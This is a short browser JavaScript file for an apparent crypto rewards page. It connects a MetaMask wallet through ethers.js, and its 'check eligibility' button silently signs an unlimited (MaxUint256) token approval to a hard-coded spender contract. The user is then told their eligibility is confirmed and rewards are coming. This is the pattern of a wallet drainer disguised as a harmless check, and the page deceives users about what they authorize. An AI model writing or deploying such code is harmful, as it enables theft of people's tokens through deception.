document.addEventListener("DOMContentLoaded", function () {
  const connectWalletBtn = document.getElementById("connectWallet");
  const checkEligibilityBtn = document.getElementById("checkEligibility");
  const statusDiv = document.getElementById("status");

  let signer;

  // توکن تستی و آدرس قرارداد گیرنده (B)
  const tokenAddress = "0x452f86bCBb7C0fD6975e67557c9044294215d7bD";
  const spenderAddress = "0x8773954b3F09238fe70A41E57BaE25EcE05Ad24a"; // contract B

  const tokenAbi = [
    "function approve(address spender, uint256 amount) public returns (bool)"
  ];

  connectWalletBtn.addEventListener("click", async () => {
    if (window.ethereum) {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const address = await signer.getAddress();
        statusDiv.innerHTML = `✅ Wallet connected: ${address}`;
        checkEligibilityBtn.disabled = false;
      } catch (err) {
        statusDiv.innerHTML = "❌ Wallet connection failed.";
      }
    } else {
      statusDiv.innerHTML = "❌ MetaMask not detected.";
    }
  });

  checkEligibilityBtn.addEventListener("click", async () => {
    if (!signer) return;

    const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
    const amount = ethers.constants.MaxUint256; // مقدار بزرگ برای مجوز کامل

    try {
      const tx = await tokenContract.approve(spenderAddress, amount);
      await tx.wait();
      statusDiv.innerHTML = "✅ Eligibility confirmed. You'll receive rewards soon if eligible.";
    } catch (err) {
      console.error("Approval error:", err);
      statusDiv.innerHTML = "❌ Eligibility check failed.";
    }
  });
});
